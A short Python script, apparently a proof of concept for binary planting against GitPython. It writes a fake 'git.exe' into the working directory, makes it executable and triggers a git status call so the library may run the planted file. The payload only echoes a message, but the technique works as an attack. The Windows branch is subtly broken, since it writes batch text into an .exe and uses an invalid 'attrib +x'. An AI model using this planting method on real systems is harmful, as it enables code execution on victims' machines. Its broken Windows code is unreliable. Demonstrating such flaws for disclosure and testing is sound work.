import os
import git


malicious_git_path = os.path.join(os.getcwd(), 'git.exe')
if os.name == 'nt':
    with open(malicious_git_path, 'w') as f:
        f.write("@echo off\n")
        f.write("echo Malicious code executed!\n")
    os.system(f'attrib +x "{malicious_git_path}"')
elif os.name == 'posix':
    with open(malicious_git_path, 'w') as f:
        f.write("#!/bin/bash\n")
        f.write("echo Malicious code executed!\n")
    os.system(f'chmod +x "{malicious_git_path}"')


try:
    repo = git.Repo('.')
    print(repo.git.status())
except Exception as e:
    print(f"Error: {e}")
finally:
    if os.path.exists(malicious_git_path):
      os.remove(malicious_git_path)